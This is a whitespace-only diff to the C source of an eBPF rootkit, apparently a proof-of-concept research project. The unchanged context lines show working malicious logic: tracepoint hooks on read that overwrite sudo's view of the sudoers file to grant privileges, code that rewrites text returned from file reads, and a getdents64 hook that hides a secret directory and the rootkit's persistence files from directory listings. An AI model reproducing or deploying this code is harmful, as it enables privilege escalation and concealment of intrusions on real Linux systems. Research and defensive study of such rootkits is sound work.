@@ -117,7 +117,7 @@ static __always_inline int handle_tp_sys_exit_read(struct sys_read_exit_ctx *ctx
 
     char sudo_line_overwrite[] = STRING_FS_SUDOERS_ENTRY;
     char c_buf_sudo[STRING_FS_SUDOERS_ENTRY_LEN] = {0};
-    
+
     if(buf == NULL){
         return -1;
     }
@@ -148,7 +148,7 @@ static __always_inline int handle_tp_sys_exit_read(struct sys_read_exit_ctx *ctx
         bpf_printk("Sudo overwritten\n");
         return 0;
     }
-    
+
     //For PoC 2 - Modifying text read from a file
     #pragma unroll
     for(int ii=0; ii<sizeof(msg_original)-1; ii++){
@@ -157,7 +157,7 @@ static __always_inline int handle_tp_sys_exit_read(struct sys_read_exit_ctx *ctx
             return -1;
         }
         char c = (char)*(c_buf+ii);
-        
+
         if( c != msg_original[ii]){
             //Not the string we are looking for
             //if(ii>0)bpf_printk("Discarded string, expected %i and received %i, %s\n", c, msg_original[ii], buf);
@@ -175,7 +175,7 @@ static __always_inline int handle_tp_sys_exit_read(struct sys_read_exit_ctx *ctx
     if(bpf_probe_write_user((void*)buf, (void*)msg_overwrite, (__u32)sizeof(msg_overwrite)-1)<0){
         bpf_printk("Error writing to user memory\n");
     }
-    
+
 
     return 0;
 }
@@ -189,7 +189,7 @@ static __always_inline int handle_tp_sys_enter_openat(struct sys_openat_enter_ct
         bpf_printk("Not found in openat\n");
         return -1;
     }*/
-    
+
     if(err < 0){
         return -1;
     }
@@ -203,8 +203,8 @@ static __always_inline int handle_tp_sys_enter_openat(struct sys_openat_enter_ct
     };
     bpf_probe_read(data.filename, STRING_FS_SUDOERS_FILE_LEN, filename);
     bpf_probe_read(data.program_name, FS_OPEN_DATA_PROGRAM_NAME_SIZE, comm);
-    
-    
+
+
 
     //Check task is sudo
     char *sudo = STRING_FS_SUDO_TASK;
@@ -285,10 +285,10 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
         return 0;
     }
     __u64 d_entry_base_addr = (__u64)(*stored_data);
-    
+
     //Length of directory buffer
     //https://linux.die.net/man/2/getdents64
-    long dir_buf_max = ctx->ret; 
+    long dir_buf_max = ctx->ret;
     long curr_offset = 0;
     bpf_printk("Starting dirent search, max:%ld, base_addr: %lx\n", dir_buf_max, d_entry_base_addr);
     //We will proceed to iterate through the buffer and look for our secret dir until we are past the limit
@@ -301,7 +301,7 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
         struct linux_dirent64 *d_entry = (struct linux_dirent64*)(d_entry_base_addr + curr_offset);
         __u16 d_reclen;
         char d_name[128];
-        bpf_probe_read(&d_reclen, sizeof(__u16), &d_entry->d_reclen); 
+        bpf_probe_read(&d_reclen, sizeof(__u16), &d_entry->d_reclen);
         //bpf_printk("Record length: %d\n", d_reclen);
         char d_type;
         bpf_probe_read(&d_type, sizeof(d_type), &d_entry->d_type);
@@ -318,7 +318,7 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
             if(previous_dir != NULL){
                 if(str_n_compare(d_name, sizeof(SECRET_DIRECTORY_NAME_HIDE)-1, SECRET_DIRECTORY_NAME_HIDE, sizeof(SECRET_DIRECTORY_NAME_HIDE)-1, sizeof(SECRET_DIRECTORY_NAME_HIDE)-1)==0){
                     __u16 prev_reclen;
-                    bpf_probe_read(&prev_reclen, sizeof(__u16), &previous_dir->d_reclen); 
+                    bpf_probe_read(&prev_reclen, sizeof(__u16), &previous_dir->d_reclen);
                     __u16 new_len = prev_reclen + d_reclen;
                     bpf_printk("Prev dir len:%d, new len:%d", prev_reclen, new_len);
                     err = bpf_probe_write_user(&(previous_dir->d_reclen), &new_len ,sizeof(__u16));
@@ -331,13 +331,13 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
             curr_offset += d_reclen;
             continue;
         }
-        
+
         //This hides files which achieve the persistence of the rootkit, so better not to be shown
         bpf_printk("FILE: d_reclen: %d, d_name: %s", d_reclen, d_name);
         if(previous_dir != NULL){
             if(str_n_compare(d_name, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1, SECRET_FILE_PERSISTENCE_NAME, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1)==0){
                 __u16 prev_reclen;
-                bpf_probe_read(&prev_reclen, sizeof(__u16), &previous_dir->d_reclen); 
+                bpf_probe_read(&prev_reclen, sizeof(__u16), &previous_dir->d_reclen);
                 __u16 new_len = prev_reclen + d_reclen;
                 bpf_printk("Prev dir len:%d, new len:%d", prev_reclen, new_len);
                 err = bpf_probe_write_user(&(previous_dir->d_reclen), &new_len ,sizeof(__u16));
@@ -346,8 +346,8 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
                 }
             }
         }
-        
-        
+
+
         //Update the pointer
         bpf_probe_read(&previous_dir, sizeof(struct linux_dirent64*), &d_entry);
         curr_offset += d_reclen;
@@ -363,26 +363,26 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
 
 /**
  * @brief Receives read event and stores the parameters into internal map
- * 
+ *
  */
-SEC("tp/syscalls/sys_enter_read") 
-int tp_sys_enter_read(struct sys_read_enter_ctx *ctx) { 
-    struct sys_read_enter_ctx *rctx = ctx; 
+SEC("tp/syscalls/sys_enter_read")
+int tp_sys_enter_read(struct sys_read_enter_ctx *ctx) {
+    struct sys_read_enter_ctx *rctx = ctx;
     if (ctx == NULL){
         bpf_printk("Error\n");
-        return 0; 
+        return 0;
     }
 
-    int fd = (int) ctx->fd; 
-    char *buf = (char*) ctx->buf; 
-    return handle_tp_sys_enter_read(ctx, fd, buf); 
-} 
+    int fd = (int) ctx->fd;
+    char *buf = (char*) ctx->buf;
+    return handle_tp_sys_enter_read(ctx, fd, buf);
+}
 
 /**
  * @brief Called AFTER the ksys_read call, checks the internal
  * map for the tgid+pid used and extracts the parameters.
  * Uses the user-space buffer reference for overwritting the returned
- * values. 
+ * values.
  */
 SEC("tp/syscalls/sys_exit_read")
 int tp_sys_exit_read(struct sys_read_exit_ctx *ctx){
@@ -397,8 +397,8 @@ int tp_sys_exit_read(struct sys_read_exit_ctx *ctx){
 }
 
 /**
- * @brief 
- * 
+ * @brief
+ *
  */
 SEC("tp/syscalls/sys_enter_openat")
 int tp_sys_enter_openat(struct sys_openat_enter_ctx *ctx){
@@ -412,8 +412,8 @@ int tp_sys_enter_openat(struct sys_openat_enter_ctx *ctx){
 
 
 /**
- * @brief 
- * 
+ * @brief
+ *
  */
 SEC("tp/syscalls/sys_enter_getdents64")
 int tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx){
@@ -426,8 +426,8 @@ int tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx){
 }
 
 /**
- * @brief 
- * 
+ * @brief
+ *
  */
 SEC("tp/syscalls/sys_exit_getdents64")
 int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx){
